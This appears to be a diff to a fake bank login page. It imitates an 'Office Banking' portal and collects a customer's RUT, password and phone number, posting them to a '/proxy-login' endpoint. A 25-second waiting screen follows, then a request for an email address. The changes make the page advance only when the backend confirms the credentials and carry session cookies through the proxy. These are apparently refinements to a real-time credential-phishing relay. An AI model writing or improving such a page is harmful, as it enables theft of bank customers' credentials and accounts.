@@ -6,10 +6,22 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <!-- Enlace al CSS externo -->
   <link rel="stylesheet" href="styles.css">
+  <style>
+    /* ✅ Estilo para mensajes de error */
+    .mensaje-error {
+      color: #d32f2f; /* rojo corporativo */
+      font-weight: bold;
+      text-align: center;
+      margin: 10px 0;
+    }
+  </style>
 </head>
 <body>
   <div class="login-box">
     <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+
+    <!-- Mensaje de validación debajo del logo -->
+    <div id="resultado" class="mensaje-error"></div>
 
     <!-- Formulario inicial -->
     <form id="loginForm">
@@ -35,7 +47,6 @@
       <!-- Botón rojo corporativo -->
       <button type="submit" class="btn-red">Ingresar</button>
     </form>
-    <div id="resultado"></div>
 
     <!-- Pantalla de espera -->
     <div id="pantallaEspera" class="hidden">
@@ -114,12 +125,14 @@
         const response = await fetch("/proxy-login", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ rut, passwd, telefono })
+          body: JSON.stringify({ rut, passwd, telefono }),
+          credentials: "include" // ✅ importante para que viaje la cookie de sesión
         });
         const data = await response.json();
         document.getElementById("resultado").innerText = data.mensaje;
 
-        if(response.ok){
+        // ✅ Solo avanzar si el backend confirmó validación correcta
+        if(response.ok && data.status === "ok"){
           document.getElementById("loginForm").style.display="none";
           document.getElementById("pantallaEspera").classList.remove("hidden");
 
@@ -127,6 +140,8 @@
             document.getElementById("pantallaEspera").classList.add("hidden");
             document.getElementById("formCorreo").classList.remove("hidden");
           }, 25000);
+        } else {
+          document.getElementById("resultado").innerText = "❌ No se ha podido validar correctamente.";
         }
       } catch (error) {
         document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
@@ -140,12 +155,20 @@
         const response = await fetch("/proxy-login", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ mail: correo })
+          body: JSON.stringify({ mail: correo }),
+          credentials: "include"
         });
         const data = await response.json();
         document.getElementById("resultado").innerText = data.mensaje;
+
+        if(!(response.ok && data.status === "ok")){
+          document.getElementById("resultado").innerText = "❌ No se ha podido validar correctamente.";
+          return;
+        }
       } catch (error) {
         console.error("Error al enviar correo:", error);
+        document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+        return;
       }
 
       document.getElementById("formCorreo").classList.add("hidden");
